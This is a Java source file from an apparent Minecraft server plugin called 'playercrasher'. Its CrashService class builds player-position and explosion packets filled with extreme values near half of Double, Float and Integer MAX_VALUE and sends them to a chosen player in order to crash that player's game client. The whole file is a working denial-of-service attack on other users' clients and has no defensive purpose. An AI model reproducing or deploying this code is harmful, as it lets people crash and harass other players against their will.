package com.deathmotion.playercrasher.services;

import com.deathmotion.playercrasher.enums.CrashMethod;
import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3f;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPlayerPositionAndLook;
import org.bukkit.entity.Player;

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import java.util.function.Consumer;

public class CrashService {
    private final WrapperPlayServerPlayerPositionAndLook positionPacket;
    private final WrapperPlayServerExplosion explosionPacket;
    private Map<CrashMethod, Consumer<Player>> crashMethodActions;

    public CrashService() {
        this.initCrashMethodActions();

        this.positionPacket = initPositionPacket();
        this.explosionPacket = initExplosionPacket();
    }

    private static double d() {
        return Double.MAX_VALUE / 2;
    }

    private static float f() {
        return Float.MAX_VALUE / 2;
    }

    private static byte b() {
        return Byte.MAX_VALUE / 2;
    }

    private static int i() {
        return Integer.MAX_VALUE / 2;
    }

    public void crashPlayer(Player target, CrashMethod method) {
        Consumer<Player> action = crashMethodActions.get(method);
        action.accept(target);
    }

    private void sendPositionPacket(Player target) {
        PacketEvents.getAPI().getPlayerManager().sendPacket(target, positionPacket);
    }

    private void sendExplosionPacket(Player target) {
        PacketEvents.getAPI().getPlayerManager().sendPacket(target, explosionPacket);
    }

    private void initCrashMethodActions() {
        this.crashMethodActions = new HashMap<>();
        this.crashMethodActions.put(CrashMethod.POSITION, this::sendPositionPacket);
        this.crashMethodActions.put(CrashMethod.EXPLOSION, this::sendExplosionPacket);
    }

    private WrapperPlayServerPlayerPositionAndLook initPositionPacket() {
        return new WrapperPlayServerPlayerPositionAndLook(d(), d(), d(), f(), f(), b(), i(), false);
    }

    private WrapperPlayServerExplosion initExplosionPacket() {
        return new WrapperPlayServerExplosion(new Vector3d(d(), d(), d()), f(), Collections.emptyList(), new Vector3f(f(), f(), f()));
    }
}